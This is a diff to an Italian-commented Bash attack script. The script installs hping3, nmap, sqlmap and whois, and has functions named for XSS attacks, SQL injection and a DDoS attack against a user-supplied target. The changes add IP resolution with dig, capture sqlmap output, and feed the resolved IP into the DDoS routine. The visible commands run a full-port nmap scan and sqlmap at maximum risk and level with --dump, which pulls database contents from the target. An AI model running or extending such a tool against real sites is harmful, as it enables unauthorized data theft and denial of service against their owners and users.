@@ -2,7 +2,7 @@
 
 # Funzione per installare i tool necessari
 install_tools() {
-    local tools=("curl" "hping3" "nmap" "sqlmap" "whois")
+    local tools=("curl" "hping3" "nmap" "sqlmap" "whois" "dig")
     
     for tool in "${tools[@]}"; do
         if ! command -v "$tool" &> /dev/null; then
@@ -21,6 +21,14 @@ ensure_http_prefix() {
         url="https://$url"
     fi
     echo "$url"
+}
+
+# Funzione per risolvere l'IP dall'URL
+resolve_ip() {
+    local url="$1"
+    local ip
+    ip=$(dig +short "$url" | head -n 1)
+    echo "$ip"
 }
 
 # Funzione per eseguire un attacco XSS e salvare i risultati
@@ -94,9 +102,9 @@ perform_sql_injection() {
 perform_full_scan() {
     local target_url="$1"
     local target_ip
-    target_ip=$(dig +short "$target_url" | head -n 1)
     local results_dir="scan_results"
     
+    target_ip=$(resolve_ip "$target_url")
     if [ -z "$target_ip" ]; then
         echo "Impossibile risolvere l'IP per $target_url"
         exit 1
@@ -109,12 +117,14 @@ perform_full_scan() {
     local nmap_file="$results_dir/nmap_scan.txt"
     local sqlmap_file="$results_dir/sqlmap_scan.txt"
     local whois_file="$results_dir/whois_lookup.txt"
+    local sqlmap_output
 
     echo "1. Esecuzione della scansione Nmap..." > "$nmap_file"
     nmap -sV -p- "$target_ip" >> "$nmap_file"
 
     echo "2. Esecuzione della scansione SQLmap..." > "$sqlmap_file"
-    sqlmap -u "$target_url" --batch --risk=3 --level=5 --dump >> "$sqlmap_file"
+    sqlmap_output=$(sqlmap -u "$target_url" --batch --risk=3 --level=5 --dump 2>&1)
+    echo "$sqlmap_output" >> "$sqlmap_file"
 
     echo "3. Esecuzione del WHOIS lookup..." > "$whois_file"
     whois "$target_url" >> "$whois_file"
@@ -154,7 +164,7 @@ case "$attack_type" in
         fi
         port="$1"
         count="$2"
-        perform_ddos_attack "$target" "$port" "$count"
+        perform_ddos_attack "$(resolve_ip "$target")" "$port" "$count"
         ;;
     sql)
         perform_sql_injection "$target"
